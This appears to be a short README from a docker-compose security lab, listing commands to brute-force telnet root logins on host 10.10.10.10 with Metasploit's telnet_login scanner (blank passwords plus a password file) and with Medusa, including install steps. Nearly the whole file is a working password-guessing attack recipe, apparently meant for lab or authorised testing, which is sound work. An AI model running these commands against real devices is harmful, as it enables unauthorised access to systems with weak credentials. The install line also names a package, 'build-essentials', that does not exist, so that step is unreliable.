
### Generel
```docker-compose up```

### Metasploit
```docker-compose run metasploit bash```

```
msfconsole
use auxiliary/scanner/telnet/telnet_login
set BLANK_PASSWORDS true
set PASS_FILE /tmp/config/az/1-5.txt
set USERNAME root
set RHOSTS 10.10.10.10
run
```

### Medusa
  * https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/

```docker-compose run metasploit medusa```

```
apt-get update
apt-get install wget build-essentials medusa
medusa -u root -P /tmp/config/az/1-5.txt -h 10.10.10.10 -M telnet
```
